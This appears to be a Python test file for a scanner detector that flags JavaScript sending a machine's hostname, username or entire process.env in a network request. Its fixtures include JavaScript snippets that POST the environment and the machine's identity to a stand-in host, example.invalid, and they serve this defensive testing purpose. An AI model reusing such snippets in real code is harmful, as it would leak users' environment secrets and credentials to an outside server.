"""`JavaScriptLeak`: the machine's identity or the whole environment in what a request sends."""

from __future__ import annotations

from cordon_scanner.detect.secretflow import JavaScriptLeak

SENDS_IDENTITY_AND_ENV = """
const https = require("https");
const os = require("os");
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env,
});
const req = https.request({ hostname: "example.invalid", method: "POST" });
req.write(data);
req.end();
"""


class TestJavaScriptLeak:
    def test_identity_and_environment_bound_then_written_to_a_request(self) -> None:
        kinds = {kind for _, kind in JavaScriptLeak.findings(SENDS_IDENTITY_AND_ENV)}
        assert kinds == {"identity", "environment"}

    def test_straight_into_a_request_call(self) -> None:
        text = "fetch('https://example.invalid/c', { method: 'POST', body: os.hostname() });"
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]

    def test_one_named_variable_is_not_the_whole_environment(self) -> None:
        text = "fetch(url, { headers: { Authorization: process.env.API_TOKEN } });"
        assert JavaScriptLeak.findings(text) == []

    def test_a_file_stream_is_not_a_request(self) -> None:
        text = (
            "const fs = require('fs'); const os = require('os');\n"
            "const log = fs.createWriteStream('app.log');\n"
            "log.write(os.hostname());\nfetch('https://example.invalid/health');\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_identity_used_locally_is_not_sent(self) -> None:
        text = "const host = os.hostname();\nconsole.log(host);\nfetch('https://example.invalid/ping');\n"
        assert JavaScriptLeak.findings(text) == []

    def test_a_request_through_a_module_chosen_at_run_time(self) -> None:
        text = (
            "const data = JSON.stringify({ env: process.env });\n"
            "const mod = url.protocol === 'https:' ? https : http;\n"
            "const req = mod.request(opts, () => {});\nreq.write(data);\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["environment"]
